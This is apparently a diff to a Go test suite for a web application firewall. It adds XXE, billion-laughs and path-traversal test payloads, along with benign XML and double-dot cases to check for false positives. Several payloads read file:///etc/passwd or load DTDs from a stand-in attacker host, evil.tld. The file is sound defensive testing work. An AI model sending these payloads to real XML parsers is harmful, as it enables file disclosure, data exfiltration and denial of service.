@@ -302,6 +302,32 @@ var evasions = []evasion{
 		body:   "<script>alert(document.domain)</script>",
 		header: [2]string{"Content-Type", "application/x-www-form-urlencoded"}},
 
+	// Inline declarations -- the half the rule always had.
+	{name: "xxe/entity system file", technique: "none",
+		body:   `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "xxe/parameter entity remote", technique: "none",
+		body:   `<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.tld/e.dtd">%remote;]><r/>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "xxe/billion laughs", technique: "none",
+		body:   `<!DOCTYPE l [<!ENTITY a "aa"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><l>&c;</l>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "xxe/attlist declaration", technique: "none",
+		body:   `<!DOCTYPE r [<!ATTLIST x y CDATA #IMPLIED>]><r/>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+
+	// Blind XXE: the entity lives in a DTD the parser fetches, so the request
+	// declares none and carries no "<!ENTITY" for a literal to find.
+	{name: "xxe/external dtd system http", technique: "none",
+		body:   `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.tld/x.dtd"><foo>&e1;</foo>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "xxe/external dtd system file", technique: "none",
+		body:   `<!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo>&e1;</foo>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	// A ".." ending the value walks a level too, and names no file -- which is
+	// what a directory-listing probe looks like.
+	{name: "traversal/bare two level", technique: "none", target: "/list?category=../.."},
+
 	// A call to a process-spawning API, in whatever language. Java was read
 	// structurally by detect/javaser and Node had rule 4021; PHP, Python, R and
 	// Groovy had nothing, and four of these are live corpus exploits.
@@ -1070,6 +1096,19 @@ var benignTraffic = []benignCase{
 	{name: "cron expression", arg: "0 */6 * * *"},
 	{name: "glob in prose", arg: "match *.log files in the directory"},
 
+	// ---- XML that references a DTD it is entitled to --------------------
+	//
+	// Rule 4005 requires SYSTEM, not PUBLIC, and this is why: every XHTML
+	// document in existence opens with a PUBLIC identifier and a w3.org URL.
+	{name: "xhtml doctype", body: `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html/>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "html5 doctype", body: `<!DOCTYPE html><html/>`,
+		header: [2]string{"Content-Type", "text/html"}},
+	{name: "doctype with no external ref", body: `<!DOCTYPE note><note><to>x</to></note>`,
+		header: [2]string{"Content-Type", "application/xml"}},
+	{name: "version range value", arg: "v1.2..v1.3"},
+	{name: "double dot filename", arg: "report..final.pdf"},
+
 	// ---- writing about running a process, rather than running one ----------
 	//
 	// "system(" and "exec(" are ordinary words -- a SQL keyword, a make
@@ -1462,6 +1501,12 @@ var declaredClasses = map[string]int{
 	"javaser":   3,
 	"ssrf":      6,
 	"protopoll": 3,
+
+	// XXE had a rule and no class, which is the hole one level up that this
+	// list exists to prevent: the coverage check cannot see a class nobody
+	// named. Found when external-DTD cases were added and the guard rejected
+	// them for belonging to a class it had never heard of.
+	"xxe": 6,
 
 	// Off-origin destinations. Absent from this list until the head-to-head
 	// harness was found to have been measuring these rules with no origins
